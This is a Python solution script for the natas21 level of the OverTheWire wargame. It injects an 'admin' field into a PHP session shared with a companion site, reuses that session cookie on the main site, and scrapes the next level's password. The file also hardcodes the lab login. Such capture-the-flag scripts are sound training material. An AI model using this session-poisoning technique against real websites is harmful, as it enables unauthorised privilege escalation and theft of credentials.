#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

url = 'http://%s.natas.labs.overthewire.org/?debug' % username
jar = {}

s = requests.session()

experimenter = "http://natas21-experimenter.natas.labs.overthewire.org/?debug"

_data = {"align": "left", "submit": "", "admin": "1"}

_response = s.post(experimenter, auth=(username, password), data=_data, cookies=jar)

id = s.cookies["PHPSESSID"]

jar = {"PHPSESSID": id}

response = s.get(url, auth=(username, password), cookies=jar)

print(re.findall('Password: (.*)</pre', response.text)[0])
